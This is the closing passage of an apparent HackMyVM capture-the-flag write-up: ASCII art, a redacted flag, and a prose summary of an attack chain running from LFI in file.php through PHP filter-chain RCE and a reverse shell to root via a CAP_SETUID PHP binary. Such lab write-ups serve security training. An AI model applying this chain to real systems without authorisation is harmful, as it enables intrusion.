⠀⣸⣿⠄⠀⢠⣾⢃⣠⡿⠋⠀⠀⠀⠄⠀⠀⢰⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠃⠀⠀⣀⣤⡴⠞⠛⠉⠹⠫⣯⣽⣿⣯⣦⡴⠶⠞⠛⠛⠛⠉⠉⠋⣷⣶⣶⣿⣿⣥⣲⡇⠈⢻⣿⣿⡟⣠⡿⡇⢻⢼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡿⠀⠀⠀⠀⢠⣿⣏⣀⠀⠀⣼⡿⣿⢸⣿⡇⠸⣧⣴⡾⢿⣿⡷⠀
⠀⢹⣿⣳⣶⣼⣗⣸⣷⠶⣦⣤⣀⣀⣀⡀⢰⡟⠁⢀⣀⣀⣀⣀⣀⣀⣠⣀⣤⣤⣤⣾⣟⣅⣤⣶⣿⢯⠶⠶⡶⣖⡻⣿⣿⣿⣯⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⣸⣟⢹⣿⠻⣦⣸⣿⡻⣿⣿⣀⣷⢸⣺⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⠖⣿⣇⣀⣀⣤⠞⠛⠁⠈⠍⠛⢺⣿⣶⡏⢸⡿⣧⢠⡟⠛⠻⣾⣿⡏⠀
⠀⢸⣿⠀⡀⠈⠙⠻⢿⣧⠀⠀⠀⠉⠉⠉⠛⠙⠋⠉⠉⠉⠉⠉⠉⠉⠁⠈⢀⠀⢹⡟⠛⣯⣽⣦⡷⠶⠶⠟⠛⠛⠉⠉⠉⢿⡉⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡧⢸⣿⠀⣽⣿⣿⣿⣿⠁⠉⣿⣾⣿⡇⠀⠀⠀⢀⣠⣤⣶⣶⣿⣿⣿⣿⠷⠿⠟⠛⠛⠉⠀⠀⠀⠀⠈⠀⠀⠀⣿⢹⡇⢸⣷⣿⣿⢿⣦⡀⣿⣿⠂⠀
⠀⢸⣿⡀⠇⡍⢠⢀⠀⠈⢷⡄⠀⠀⠀⠀⠀⠀⠀⠐⠈⠀⠀⠀⠀⠀⠀⠀⠀⠆⢸⣗⢰⣿⠀⢹⡄⠀⠀⠀⠀⠀⠐⠀⠀⠘⢷⡄⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠁⢸⢿⡞⠋⢙⣿⣡⣾⣿⠉⣿⣿⣿⣷⣶⣿⣿⠿⠿⠛⠋⠉⠉⠁⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⢸⡇⠘⢿⣿⣿⡌⣿⣹⣿⡏⠀⠀
⠀⢸⣿⣇⡆⠀⠐⠈⠀⣀⣾⣻⣶⣶⣶⣶⣶⣶⣶⣶⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣼⣿⠛⠻⣆⠈⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠹⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠈⣾⣇⣠⣾⣿⣻⣇⠘⣷⣿⣿⠋⢿⡿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣤⣤⣤⣠⣀⡀⣀⣀⣀⣀⣠⣤⣾⣿⣿⠇⠀⠈⢿⣧⣿⣾⣟⡿⠀⠀⠀
⠀⢸⣿⡍⠟⠷⠶⣤⣼⣿⣿⠿⠿⠿⠿⠿⠿⢿⢿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠙⣧⡀⠙⢶⣶⣶⣿⣟⣿⣟⣟⣚⣓⣿⣤⡼⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⢿⡉⢀⡟⢸⡟⣿⣿⣿⡏⠀⠈⣷⣤⣤⣽⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠛⠙⠙⠉⠉⠉⠉⠿⢯⣌⣀⣀⣀⣀⣉⣿⣽⡿⠁⠀⠀⠀
⠀⠘⠻⢷⣶⣦⣶⣿⣿⣿⣿⣛⣛⡛⡻⢟⠿⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⣿⠿⣿⣗⠀⠀⠈⠿⢛⢩⢏⡉⣉⣉⢉⣍⣙⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠈⠿⣾⡇⣸⣡⣿⣷⠟⠛⠛⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀
⠀⢠⠀⠀⠀⠀⠉⠉⠉⠉⠙⠻⠿⢿⣽⣿⣿⣿⣿⣿⣿⡿⠖⠳⠶⠶⠶⠿⠿⠶⠶⠼⠿⠿⠿⠿⠿⠿⠿⠿⠿⠽⠯⠿⠿⠿⠶⠶⠶⠶⠶⠚⠚⠛⠛⠛⠛⠛⠛⠛⠛⠛⠻⣆⡀⠀⠀⠀⠉⠙⢻⣭⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⠀⡀⡀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡛⠲⠶⢶⣶⣾⣿⣋⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                  HMV{This[REDACTED]}
```

---

## Attack Chain Summary
1. **Reconnaissance**: Initial host identification was performed using network sweeping followed by detailed service enumeration with Nmap and Nikto to find open ports and web vulnerabilities.
2. **Vulnerability Discovery**: Manual testing and directory brute forcing with Gobuster identified a Local File Inclusion vulnerability in the `file.php` script through the `file` parameter.
3. **Exploitation**: The LFI vulnerability was weaponized using the PHP filter chain generator tool to achieve Remote Code Execution, which was then used to establish a reverse shell connection.
4. **Internal Enumeration**: Once inside the system, a search for misconfigured binaries revealed that the PHP 8.1 executable possessed the CAP_SETUID capability.
5. **Privilege Escalation**: The CAP_SETUID capability of the PHP binary was used to set the process UID to root and spawn a bash shell, providing complete administrative access.

